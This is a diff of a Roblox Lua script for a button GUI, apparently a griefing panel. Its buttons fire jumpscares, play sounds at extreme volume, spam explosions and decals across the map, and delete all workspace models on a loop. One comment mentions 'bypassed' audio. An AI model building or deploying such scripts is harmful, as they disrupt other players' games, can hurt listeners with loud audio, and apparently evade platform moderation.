 
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Parent = billboard
-        textLabel.Size = UDim2.new(1, 0, 1, 0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.Text = "Yaazkidd"
-        textLabel.TextColor3 = Color3.fromRGB(0, 0, 139)
-        textLabel.TextScaled = true
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = billboard
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "Yaazkidd"
+    textLabel.TextColor3 = Color3.fromRGB(0, 0, 139)
+    textLabel.TextScaled = true
 
-        billboard.Parent = head
-    end)
+    billboard.Parent = head
+end)
 
 createButton("Billboard Pyramid", function()
-        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local head = character:WaitForChild("Head")
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local head = character:WaitForChild("Head")
 
-        local billboard = Instance.new("BillboardGui")
-        billboard.Adornee = head
-        billboard.Size = UDim2.new(0, 200, 0, 100)
-        billboard.AlwaysOnTop = true
-        billboard.StudsOffset = Vector3.new(0, 3, 0)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 100)
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
 
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Parent = billboard
-        textLabel.Size = UDim2.new(1, 0, 1, 0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.Text = "Pyramid"
-        textLabel.TextColor3 = Color3.fromRGB(139, 0, 0)
-        textLabel.TextScaled = true
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = billboard
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "Pyramid"
+    textLabel.TextColor3 = Color3.fromRGB(139, 0, 0)
+    textLabel.TextScaled = true
 
-        billboard.Parent = head
-    end)
+    billboard.Parent = head
+end)
 
-    createButton("Jumpscare", function()
-        local blackScreen = Instance.new("Frame", screenGui)
-        blackScreen.Size = UDim2.new(1, 0, 1, 0)
-        blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        blackScreen.ZIndex = 10
+createButton("Jumpscare", function()
+    local blackScreen = Instance.new("Frame", screenGui)
+    blackScreen.Size = UDim2.new(1, 0, 1, 0)
+    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackScreen.ZIndex = 10
 
-        local jumpscareImage = Instance.new("ImageLabel", blackScreen)
-        jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
-        jumpscareImage.Image = "rbxassetid://134742973539106"
-        jumpscareImage.BackgroundTransparency = 1
-        jumpscareImage.ZIndex = 11
+    local jumpscareImage = Instance.new("ImageLabel", blackScreen)
+    jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
+    jumpscareImage.Image = "rbxassetid://134742973539106"
+    jumpscareImage.BackgroundTransparency = 1
+    jumpscareImage.ZIndex = 11
 
-        local sound = Instance.new("Sound", game.Workspace)
-        sound.SoundId = "rbxassetid://18260230947"
-        sound:Play()
-        
-        task.wait(4)
-        blackScreen:Destroy()
-        sound:Destroy()
-    end)
+    local sound = Instance.new("Sound", game.Workspace)
+    sound.SoundId = "rbxassetid://18260230947"
+    sound:Play()
+    
+    task.wait(4)
+    blackScreen:Destroy()
+    sound:Destroy()
+end)
 
-    createButton("Jumpscare 2", function()
-        local blackScreen = Instance.new("Frame", screenGui)
-        blackScreen.Size = UDim2.new(1, 0, 1, 0)
-        blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        blackScreen.ZIndex = 10
+createButton("Jumpscare 2", function()
+    local blackScreen = Instance.new("Frame", screenGui)
+    blackScreen.Size = UDim2.new(1, 0, 1, 0)
+    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackScreen.ZIndex = 10
 
-        local jumpscareImage = Instance.new("ImageLabel", blackScreen)
-        jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
-        jumpscareImage.Image = "rbxassetid://119263597683104"
-        jumpscareImage.BackgroundTransparency = 1
-        jumpscareImage.ZIndex = 11
+    local jumpscareImage = Instance.new("ImageLabel", blackScreen)
+    jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
+    jumpscareImage.Image = "rbxassetid://119263597683104"
+    jumpscareImage.BackgroundTransparency = 1
+    jumpscareImage.ZIndex = 11
 
-        local sound = Instance.new("Sound", game.Workspace)
-        sound.SoundId = "rbxassetid://18260230947"
-        sound:Play()
-        
-        task.wait(4)
-        blackScreen:Destroy()
-        sound:Destroy()
-    end)
+    local sound = Instance.new("Sound", game.Workspace)
+    sound.SoundId = "rbxassetid://18260230947"
+    sound:Play()
+    
+    task.wait(4)
+    blackScreen:Destroy()
+    sound:Destroy()
+end)
 
-    createButton("Jumpscare 3", function()
-        local blackScreen = Instance.new("Frame", screenGui)
-        blackScreen.Size = UDim2.new(1, 0, 1, 0)
-        blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        blackScreen.ZIndex = 10
+createButton("Jumpscare 3", function()
+    local blackScreen = Instance.new("Frame", screenGui)
+    blackScreen.Size = UDim2.new(1, 0, 1, 0)
+    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackScreen.ZIndex = 10
 
-        local jumpscareImage = Instance.new("ImageLabel", blackScreen)
-        jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
-        jumpscareImage.Image = "rbxassetid://81930415446729"
-        jumpscareImage.BackgroundTransparency = 1
-        jumpscareImage.ZIndex = 11
+    local jumpscareImage = Instance.new("ImageLabel", blackScreen)
+    jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
+    jumpscareImage.Image = "rbxassetid://81930415446729"
+    jumpscareImage.BackgroundTransparency = 1
+    jumpscareImage.ZIndex = 11
 
-        local sound = Instance.new("Sound", game.Workspace)
-        sound.SoundId = "rbxassetid://6129291390"
-        sound.Volume = 9999
-        sound:Play()
-        
-        task.wait(9)
-        blackScreen:Destroy()
-        sound:Destroy()
-    end)
+    local sound = Instance.new("Sound", game.Workspace)
+    sound.SoundId = "rbxassetid://6129291390"
+    sound.Volume = 9999
+    sound:Play()
+    
+    task.wait(9)
+    blackScreen:Destroy()
+    sound:Destroy()
+end)
 
 createButton("Jumpscare Jeff Killer", function()
-        local blackScreen = Instance.new("Frame", screenGui)
-        blackScreen.Size = UDim2.new(1, 0, 1, 0)
-        blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        blackScreen.ZIndex = 10
+    local blackScreen = Instance.new("Frame", screenGui)
+    blackScreen.Size = UDim2.new(1, 0, 1, 0)
+    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackScreen.ZIndex = 10
 
-        local jumpscareImage = Instance.new("ImageLabel", blackScreen)
-        jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
-        jumpscareImage.Image = "rbxassetid://109035134738815"
-        jumpscareImage.BackgroundTransparency = 1
-        jumpscareImage.ZIndex = 11
+    local jumpscareImage = Instance.new("ImageLabel", blackScreen)
+    jumpscareImage.Size = UDim2.new(1, 0, 1, 0)
+    jumpscareImage.Image = "rbxassetid://109035134738815"
+    jumpscareImage.BackgroundTransparency = 1
+    jumpscareImage.ZIndex = 11
 
-        local sound = Instance.new("Sound", game.Workspace)
-        sound.SoundId = "rbxassetid://6129291390"
-        sound.Volume = 9999
-        sound:Play()
-        
-        task.wait(9)
-        blackScreen:Destroy()
-        sound:Destroy()
-    end)
+    local sound = Instance.new("Sound", game.Workspace)
+    sound.SoundId = "rbxassetid://6129291390"
+    sound.Volume = 9999
+    sound:Play()
+    
+    task.wait(9)
+    blackScreen:Destroy()
+    sound:Destroy()
+end)
 
-    createButton("666", function()
-        for _, v in pairs(game.Workspace:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.BrickColor = BrickColor.new("Really black")
-                v.TopSurface = "Smooth"
-                v.BottomSurface = "Smooth"
+createButton("666", function()
+    for _, v in pairs(game.Workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.BrickColor = BrickColor.new("Really black")
+            v.TopSurface = "Smooth"
+            v.BottomSurface = "Smooth"
 
-                local selection = Instance.new("SelectionBox", v)
-                selection.Adornee = v
-                selection.Color3 = Color3.new(1, 0, 0)
+            local selection = Instance.new("SelectionBox", v)
+            selection.Adornee = v
+            selection.Color3 = Color3.new(1, 0, 0)
 
-                local pointLight = Instance.new("PointLight", v)
-                pointLight.Color = Color3.new(1, 0, 0)
-                pointLight.Range = 15
-                pointLight.Brightness = 5
+            local pointLight = Instance.new("PointLight", v)
+            pointLight.Color = Color3.new(1, 0, 0)
+            pointLight.Range = 15
+            pointLight.Brightness = 5
 
-                local fire = Instance.new("Fire", v)
-                fire.Size = 19
-                fire.Heat = 22
-            end
+            local fire = Instance.new("Fire", v)
+            fire.Size = 19
+            fire.Heat = 22
         end
+    end
 
-        local lighting = game:GetService("Lighting")
-        lighting.TimeOfDay = "00:00:00"
-        lighting.Brightness = 0
-        lighting.ShadowColor = Color3.new(0, 0, 0)
-        lighting.Ambient = Color3.new(1, 0, 0)
-        lighting.FogEnd = 200
-        lighting.FogColor = Color3.new(0, 0, 0)
-    end)
+    local lighting = game:GetService("Lighting")
+    lighting.TimeOfDay = "00:00:00"
+    lighting.Brightness = 0
+    lighting.ShadowColor = Color3.new(0, 0, 0)
+    lighting.Ambient = Color3.new(1, 0, 0)
+    lighting.FogEnd = 200
+    lighting.FogColor = Color3.new(0, 0, 0)
+end)
 
-    createButton("Rainbow 666", function()
-        local function rainbowEffect(selectionBox)
-            local hue = 0
-            while true do
-                hue = (hue + 0.01) % 1
-                selectionBox.Color3 = Color3.fromHSV(hue, 1, 1)
-                wait(0.01)
-            end
+createButton("Rainbow 666", function()
+    local function rainbowEffect(selectionBox)
+        local hue = 0
+        while true do
+            hue = (hue + 0.01) % 1
+            selectionBox.Color3 = Color3.fromHSV(hue, 1, 1)
+            wait(0.01)
         end
+    end
 
-        for _, v in pairs(game.Workspace:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.BrickColor = BrickColor.new("Really black")
-                v.TopSurface = "Smooth"
-                v.BottomSurface = "Smooth"
+    for _, v in pairs(game.Workspace:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.BrickColor = BrickColor.new("Really black")
+            v.TopSurface = "Smooth"
+            v.BottomSurface = "Smooth"
 
-                local selection = Instance.new("SelectionBox", v)
-                selection.Adornee = v
-                selection.Color3 = Color3.new(1, 0, 0)
-                coroutine.wrap(rainbowEffect)(selection)
+            local selection = Instance.new("SelectionBox", v)
+            selection.Adornee = v
+            selection.Color3 = Color3.new(1, 0, 0)
+            coroutine.wrap(rainbowEffect)(selection)
 
-                local pointLight = Instance.new("PointLight", v)
-                pointLight.Color = Color3.new(1, 0, 0)
-                pointLight.Range = 15
-                pointLight.Brightness = 5
+            local pointLight = Instance.new("PointLight", v)
+            pointLight.Color = Color3.new(1, 0, 0)
+            pointLight.Range = 15
+            pointLight.Brightness = 5
 
-                local fire = Instance.new("Fire", v)
-                fire.Size = 19
-                fire.Heat = 22
-            end
+            local fire = Instance.new("Fire", v)
+            fire.Size = 19
+            fire.Heat = 22
         end
+    end
 
-        local lighting = game:GetService("Lighting")
-        lighting.TimeOfDay = "00:00:00"
-        lighting.Brightness = 0
-        lighting.ShadowColor = Color3.new(0, 0, 0)
-        lighting.Ambient = Color3.new(1, 0, 0)
-        lighting.FogEnd = 200
-        lighting.FogColor = Color3.new(0, 0, 0)
-    end)
+    local lighting = game:GetService("Lighting")
+    lighting.TimeOfDay = "00:00:00"
+    lighting.Brightness = 0
+    lighting.ShadowColor = Color3.new(0, 0, 0)
+    lighting.Ambient = Color3.new(1, 0, 0)
+    lighting.FogEnd = 200
+    lighting.FogColor = Color3.new(0, 0, 0)
+end)
 
-    createButton("Play Theme", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://1839272148"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.8
-            soundInstance:Play()
-        end
-    end)
+createButton("Play Theme", function()
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://1839272148"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance.PlaybackSpeed = 0.8
+        soundInstance:Play()
+    end
+end)
 
-    createButton("Play Theme 2", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://1839246774"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance:Play()
-        end
-    end)
+createButton("Play Theme 2", function()
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://1839246774"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance:Play()
+    end
+end)
 
-    createButton("Play Theme 3", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://1839270892"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance:Play()
-        end
-    end)
+createButton("Play Theme 3", function()
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://1839270892"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance:Play()
+    end
+end)
 
 createButton("Sick of it", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://132225036480123"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.1
-            soundInstance:Play()
-        end
-    end)
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://132225036480123"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance.PlaybackSpeed = 0.1
+        soundInstance:Play()
+    end
+end)
 
 createButton("Chaos (Theme if want destroy only!)", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://1843497734"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.8
-            soundInstance:Play()
-        end
-    end)
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://1843497734"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance.PlaybackSpeed = 0.8
+        soundInstance:Play()
+    end
+end)
 
-    createButton("Firepartz (song)", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://119888339966615"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.094
-            soundInstance:Play()
-        end
-    end)
+createButton("Firepartz (song)", function()
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://119888339966615"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance.PlaybackSpeed = 0.094
+        soundInstance:Play()
+    end
+end)
 
 createButton("Very funni jumpstyle song", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://81704507776926"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.7
-            soundInstance:Play()
-        end
-    end)
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://81704507776926"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance.PlaybackSpeed = 0.7
+        soundInstance:Play()
+    end
+end)
 
-    createButton("Gangster theme remix", function()
-        if soundInstance then
-            soundInstance:Destroy()
-            soundInstance = nil
-        else
-            soundInstance = Instance.new("Sound", game.Workspace)
-            soundInstance.SoundId = "rbxassetid://5228173823"
-            soundInstance.Looped = true
-            soundInstance.Volume = 30
-            soundInstance:Play()
-        end
-    end)
+createButton("Gangster theme remix", function()
+    if soundInstance then
+        soundInstance:Destroy()
+        soundInstance = nil
+    else
+        soundInstance = Instance.new("Sound", game.Workspace)
+        soundInstance.SoundId = "rbxassetid://5228173823"
+        soundInstance.Looped = true
+        soundInstance.Volume = 30
+        soundInstance:Play()
+    end
+end)
 
-    createButton("Stop all sound", function()
-        for _, sound in pairs(workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
-            end
+createButton("Stop all sound", function()
+    for _, sound in pairs(workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
         end
+    end
 
-        for _, sound in pairs(game.SoundService:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
-            end
+    for _, sound in pairs(game.SoundService:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
         end
-    end)
+    end
+end)
 
 createButton("Face all billboard", function()
-    local textureId = "rbxassetid://111936421767453" -- Defined inside createButton function
+    local textureId = "rbxassetid://111936421767453"
 
     for _, player in pairs(game.Players:GetPlayers()) do
         if player.Character then
             local head = player.Character:FindFirstChild("Head")
             if head then
-                -- Remove existing BillboardGui to prevent duplicates
                 if head:FindFirstChild("FaceBillboard") then
                     head:FindFirstChild("FaceBillboard"):Destroy()
                 end
 
-                -- Create BillboardGui
                 local billboard = Instance.new("BillboardGui")
                 billboard.Name = "FaceBillboard"
                 billboard.Adornee = head
-                billboard.Size = UDim2.new(2.5, 0, 2.5, 0) -- Adjusted to fit face
-                billboard.StudsOffset = Vector3.new(0, 0, 0.01) -- Slightly in front of face
+                billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
+                billboard.StudsOffset = Vector3.new(0, 0, 0.01)
                 billboard.AlwaysOnTop = true
                 billboard.LightInfluence = 0
                 billboard.Parent = head
 
-                -- Create ImageLabel for the face texture
                 local imageLabel = Instance.new("ImageLabel")
                 imageLabel.Size = UDim2.new(1, 0, 1, 0)
                 imageLabel.BackgroundTransparency = 1
                 imageLabel.Image = textureId
                 imageLabel.Parent = billboard
 
-                -- Align BillboardGui to the face
                 billboard.StudsOffsetWorldSpace = head.CFrame.LookVector * 0.01
             end
         end
@@ -969,31 +959,25 @@ createButton("Face all billboard", function()
 end)
 
 createButton("Nootaz Warning: Be ready for chaos.", function()
-    -- Variables
     local pingudecal = "http://www.roblox.com/asset/?id=382332426"
     local didpingu = false
 
     if didpingu then
-        warn("Already Ran! Did not execute the script!")
         return
     end
 
     didpingu = true
 
-    -- Play Sound (Music First, No Chaos Yet)
     local nooties = Instance.new("Sound", workspace)
-    nooties.SoundId = "rbxassetid://82174917569958" -- Corrected sound ID format
+    nooties.SoundId = "rbxassetid://82174917569958"
     nooties.Volume = 1
-    nooties.PlaybackSpeed = 0.102 -- Set sound speed
+    nooties.PlaybackSpeed = 0.102
     nooties.Looped = true
     nooties.Parent = workspace
     nooties:Play()
 
-    -- Wait Before Chaos Starts
-    task.wait(10) -- 10 seconds of peaceful music, then chaos begins!
+    task.wait(10)
 
-    -- INTENSE CHAOS STARTS HERE
-    -- Set Skybox to Pingu Everywhere
     local Sky = Instance.new("Sky", game.Lighting)
     Sky.SkyboxBk = pingudecal
     Sky.SkyboxDn = pingudecal
@@ -1002,7 +986,6 @@ createButton("Nootaz Warning: Be ready for chaos.", function()
     Sky.SkyboxRt = pingudecal
     Sky.SkyboxUp = pingudecal
 
-    -- Add Pingu Decals to EVERY Part!
     local function addDecalsToPart(part)
         local faces = {"Top", "Bottom", "Left", "Right", "Front", "Back"}
         for _, face in pairs(faces) do
@@ -1012,27 +995,23 @@ createButton("Nootaz Warning: Be ready for chaos.", function()
         end
     end
 
-    -- Explosions and Decals on EVERY PART!
     for _, obj in pairs(workspace:GetDescendants()) do
         if obj:IsA("Part") or obj:IsA("MeshPart") then
-            -- Add Pingu Decals
             addDecalsToPart(obj)
 
-            -- Add Particle Effect for Extra Chaos
             local VTest = Instance.new("ParticleEmitter", obj)
             VTest.Texture = pingudecal
-            VTest.Speed = NumberRange.new(500) -- Faster effect!
-            VTest.Rate = 2000 -- More particles!
-            VTest.Lifetime = NumberRange.new(3) -- Short-lived spam!
-            VTest.Size = NumberSequence.new(10, 100) -- Big particles!
+            VTest.Speed = NumberRange.new(500)
+            VTest.Rate = 2000
+            VTest.Lifetime = NumberRange.new(3)
+            VTest.Size = NumberSequence.new(10, 100)
 
-            -- Spam Explosions
             coroutine.wrap(function()
                 while true do
-                    task.wait(0.1) -- Spam explosions every 0.1s!
+                    task.wait(0.1)
                     local Explosion = Instance.new("Explosion", obj)
-                    Explosion.BlastRadius = 50000 -- HUGE destruction!
-                    Explosion.BlastPressure = 1000000 -- Super strong explosions!
+                    Explosion.BlastRadius = 50000
+                    Explosion.BlastPressure = 1000000
                 end
             end)()
         end
@@ -1042,7 +1021,6 @@ end)
 createButton("Toadroast", function()
     math.randomseed(tick() % 1 * 1e6)
 
-    -- Sky Effect
     local sky = coroutine.create(function()
         while task.wait(0.3) do
             local s = Instance.new("Sky", game.Lighting)
@@ -1053,7 +1031,6 @@ createButton("Toadroast", function()
         end
     end)
 
-    -- Delete all models every 0.3s
     local del = coroutine.create(function()
         while task.wait(0.3) do
             for _, v in pairs(workspace:GetChildren()) do
@@ -1064,13 +1041,11 @@ createButton("Toadroast", function()
         end
     end)
 
-    -- Sound IDs for random noises
     local noises = {'rbxassetid://230287740', 'rbxassetid://271787597', 'rbxassetid://153752123', 'rbxassetid://271787503'}
 
-    -- Background Sound Loop (Raining Men Bypassed Audio)
     local sound = coroutine.create(function()
         while task.wait(0.2) do
-            for i = 1, 3 do  -- Reduced to 3 overlapping sounds
+            for i = 1, 3 do
                 local extraSound = Instance.new("Sound", workspace)
                 extraSound.SoundId = "rbxassetid://141509625"
                 extraSound.Name = "RAINING MEN"
@@ -1085,7 +1060,6 @@ createButton("Toadroast", function()
         end
     end)
 
-    -- Repeating Message
     local msg = coroutine.create(function()
         while task.wait(0.4) do
             local message = Instance.new("Message", workspace)
@@ -1095,10 +1069,9 @@ createButton("Toadroast", function()
         end
     end)
 
-    -- Faster Rain with better ground deletion
     local rain = coroutine.create(function()
         while task.wait(0.2) do
-            for i = 1, 5 do  -- Reduced to 5 toads at a time
+            for i = 1, 5 do
                 local part = Instance.new("Part", workspace)
                 part.Name = "Meshes/toad (3)"
                 part.CanCollide = false
@@ -1111,8 +1084,7 @@ createButton("Toadroast", function()
                 mesh.MeshId = "rbxassetid://7234998844"
                 mesh.TextureId = "rbxassetid://1009824086"
 
-                -- Play Loud Random Noise
-                for i = 1, 3 do  -- Reduced to 3 overlapping noise sounds
+                for i = 1, 3 do
                     local sound = Instance.new("Sound", part)
                     sound.SoundId = noises[math.random(1, #noises)]
                     sound.Volume = 10
@@ -1122,34 +1094,29 @@ createButton("Toadroast", function()
                     end)
                 end
 
-                -- Improved Ground Deletion
                 local deletePart = function()
                     if part and part.Parent then
                         part:Destroy()
                     end
                 end
 
-                -- Touched event for quick deletion
                 part.Touched:Connect(function(hit)
                     if hit:IsA("BasePart") and hit.Position.Y < 12 then
                         deletePart()
                     end
                 end)
 
-                -- Timer-based deletion (Backup method)
-                game:GetService("Debris"):AddItem(part, 5)  -- Auto delete in 5 seconds
+                game:GetService("Debris"):AddItem(part, 5)
             end
         end
     end)
 
-    -- Start Coroutines
     coroutine.resume(sky)
     coroutine.resume(del)
     coroutine.resume(sound)
     coroutine.resume(msg)
     coroutine.resume(rain)
 
-    -- Background Music (Max Volume)
     local music = Instance.new("Sound", workspace)
     music.Name = "BackgroundMusic"
     music.SoundId = "rbxassetid://97797838120232"
@@ -1158,861 +1125,560 @@ createButton("Toadroast", function()
     music.Pitch = 0.2
     music:Play()
 
-    -- Warning Message
     local hint = Instance.new("Hint", workspace)
     hint.Text = "Imagine getting toadroast -YaazDaQuitos"
     task.wait(10)
     hint:Destroy()
 end)
 
+createButton("IT'S HOTDOG DAY!!", function()
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if character then
+        for _, part in pairs(game.Workspace:GetDescendants()) do
+            if part:IsA("BasePart") or part:IsA("Decal") then
+                part.Transparency = 1
+            end
+        end
 
-createButton("Cashier Roast", function()
-    local Players = game:GetService("Players")
-    local Lighting = game:GetService("Lighting")
-    local SoundService = game:GetService("SoundService")
-    local Debris = game:GetService("Debris")
+        for _, part in pairs(character:GetChildren()) do
+            if part:IsA("BasePart") or part:IsA("Decal") then
+                part.Transparency = 1
+            end
+        end
 
-    local player = Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-
-    repeat task.wait() until character:FindFirstChild("HumanoidRootPart")
-
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    local rootPart = character:FindFirstChild("HumanoidRootPart")
-
-    -- **👻 Hide Player & Disable Movement**
-    for _, v in pairs(character:GetDescendants()) do
-        if v:IsA("BasePart") then
-            v.Transparency = 1
-            v.CanCollide = false
-        elseif v:IsA("Decal") then
-            v:Destroy()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
         end
     end
-    if humanoid then
-        humanoid.WalkSpeed = 0
-        humanoid.JumpPower = 0
+
+    local hint = Instance.new("Hint")
+    hint.Text = "HOT DOGGED BY YAAZ? HOW LOSER!"
+    hint.Parent = game.Workspace
+
+    for _, sound in pairs(game.Workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+        end
     end
 
-    -- **🔄 Stop All Sounds & Play Horror Music**
-    for _, sound in pairs(SoundService:GetDescendants()) do
-        if sound:IsA("Sound") then sound:Stop() end
-    end
-    local music = Instance.new("Sound", SoundService)
-    music.SoundId = "rbxassetid://1836137223"
-    music.Looped = true
-    music.Volume = 5
-    music:Play()
+    local hotDogSong = Instance.new("Sound")
+    hotDogSong.SoundId = "rbxassetid://121252384962048"
+    hotDogSong.Looped = true
+    hotDogSong.Volume = 999999
+    hotDogSong.Parent = game.Workspace
+    hotDogSong:Play()
 
-    -- **🌌 Set Scary Skybox**
-    local sky = Instance.new("Sky", Lighting)
-    sky.SkyboxBk = "rbxassetid://110077545590416"
-    sky.SkyboxDn = "rbxassetid://110077545590416"
-    sky.SkyboxFt = "rbxassetid://110077545590416"
-    sky.SkyboxLf = "rbxassetid://110077545590416"
-    sky.SkyboxRt = "rbxassetid://110077545590416"
-    sky.SkyboxUp = "rbxassetid://110077545590416"
-
-    -- **🛑 Fixed Falling Mesh (FALLS PROPERLY FOR 7 SECONDS)**
-    local function createMesh()
+    spawn(function()
         while true do
-            for _ = 1, 15 do -- **Faster Mesh Rain**
-                local part = Instance.new("Part", workspace)
-                part.Name = "CashierKiller"
-                part.Size = Vector3.new(20, 20, 20)
-                part.Position = Vector3.new(math.random(-3000, 1000), math.random(500, 1000), math.random(-3000, 3000))
-                part.CanCollide = false
-                part.Anchored = false  
+            for i = 1, 6 do
+                local hotdog = Instance.new("Part", workspace)
+                hotdog.Name = "HotDog"
+                hotdog.Size = Vector3.new(1, 1, 1)
+                hotdog.Position = Vector3.new(
+                    math.random(-250, 250),
+                    math.random(80, 120),
+                    math.random(-250, 250)
+                )
+                hotdog.CanCollide = false
+                hotdog.Anchored = false
 
-                -- **Add Mesh**
-                local mesh = Instance.new("SpecialMesh", part)
+                local mesh = Instance.new("SpecialMesh", hotdog)
                 mesh.MeshType = "FileMesh"
-                mesh.MeshId = "rbxassetid://10802419004"
-                mesh.TextureId = "rbxassetid://10802419119"
-                mesh.Scale = Vector3.new(20, 20, 20)
+                mesh.MeshId = "rbxassetid://6318954843"
+                mesh.TextureId = "rbxassetid://6318954910"
+                mesh.Scale = Vector3.new(7, 7, 7)
 
-                -- **Make It Fall Properly**
-                local velocity = Instance.new("BodyVelocity", part)
-                velocity.Velocity = Vector3.new(0, -50, 0) -- **Falls smoothly, not instantly**
-                velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge) 
+                hotdog.Velocity = Vector3.new(0, -50, 0)
 
-                -- **Delete After 7 Seconds**
-                task.delay(7, function()
-                    part:Destroy()
-                end)
-            end
-            task.wait(0.05) -- **Faster spawn rate**
-        end
-    end
+                spawn(function()
+                    local startTime = tick() 
+                    local lastVelocity = hotdog.AssemblyLinearVelocity.Magnitude
+                    while hotdog and hotdog.Parent do
+                        wait(0.5)
 
-    -- **🌧️ Super-Fast Rain**
-    local function createRain()
-        while true do
-            for _ = 1, 150 do -- **150 rain drops at once**
-                local rainPart = Instance.new("Part", workspace)
-                rainPart.Size = Vector3.new(0.3, 2, 0.3)
